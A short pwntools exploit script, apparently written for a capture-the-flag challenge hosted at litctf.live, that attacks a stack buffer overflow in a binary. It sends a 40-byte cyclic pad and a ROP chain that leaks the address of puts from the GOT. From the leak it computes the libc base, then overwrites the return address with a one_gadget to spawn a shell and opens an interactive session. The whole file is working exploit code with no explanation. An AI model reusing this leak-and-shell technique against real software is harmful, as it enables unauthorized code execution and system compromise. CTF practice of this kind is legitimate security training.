from pwn import *

import angr, angrop

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)
libc = ELF('libc.so', checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('litctf.live',31788)
    else:
        return process(e.path,level='error')


p = start()
pad = cyclic(40)

ret=p64(0x401016)
puts_plt=p64(e.plt['puts'])
pop_rdi =p64(0x40126b)
puts_got=p64(e.got['puts'])
main=p64(e.sym['main'])

chain =  ret
chain += pop_rdi
chain += puts_got
chain += puts_plt
chain += main

p.recvuntil(b':sadness:')
p.sendline(pad+chain)
p.recvline()
leak=u64(p.recv(6)+b'\x00\x00')
libc.address=leak-libc.sym['puts']

info("Leak: %s" %hex(leak))
info("Base: %s" %hex(libc.address))

p.recvuntil(b':sadness:')
one_gadget = p64(libc.address+0xe3b01)
p.sendline(cyclic(40)+one_gadget)

p.interactive()
